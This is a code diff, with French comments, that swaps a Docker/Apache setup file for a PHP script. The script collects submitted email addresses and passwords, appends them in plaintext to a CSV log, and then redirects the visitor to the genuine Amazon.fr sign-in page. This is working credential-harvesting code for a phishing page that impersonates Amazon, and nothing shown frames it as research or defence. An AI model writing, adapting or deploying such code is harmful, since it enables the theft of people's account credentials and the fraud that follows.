@@ -1,29 +1,35 @@
-FROM php:8.1-apache
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Récupérer les données soumises
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-# Installer les dépendances
-RUN apt-get update && apt-get install -y \
-    libzip-dev \
-    zip \
-    unzip \
-    && docker-php-ext-install pdo_mysql zip
+    // Nettoyer les données pour éviter les failles XSS
+    $email_clean = htmlspecialchars($email);
+    $password_clean = htmlspecialchars($password);
 
-# Activer mod_rewrite
-RUN a2enmod rewrite
+    // Spécifier le fichier CSV avec un chemin absolu
+    $file = '/var/log/log.csv';
 
-# Créer le fichier log.csv et définir les permissions
-RUN touch /var/www/html/log.csv && \
-    chown www-data:www-data /var/www/html/log.csv && \
-    chmod 666 /var/www/html/log.csv
+    // Ouvrir le fichier CSV en mode ajout (append)
+    $handle = fopen($file, 'a');
 
-# Copier les fichiers de l'application
-COPY . /var/www/html/
+    // Vérifier si le fichier a bien été ouvert
+    if (!$handle) {
+        die('Impossible d\'ouvrir le fichier log.csv. Vérifiez les permissions.');
+    }
 
-# Configurer les permissions
-RUN chown -R www-data:www-data /var/www/html && \
-    chmod -R 775 /var/www/html
+    // Créer une ligne avec l'email et le mot de passe
+    $data = array($email_clean, $password_clean);
 
-# Exposer le port 80
-EXPOSE 80
+    // Écrire les données dans le fichier CSV
+    fputcsv($handle, $data);
 
-# Lancer Apache
-CMD ["apache2-foreground"]
+    // Fermer le fichier
+    fclose($handle);
+
+    // Rediriger vers le site officiel d'Amazon
+    header("Location: https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2Fyour-account%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
+    exit();
+}
+?>
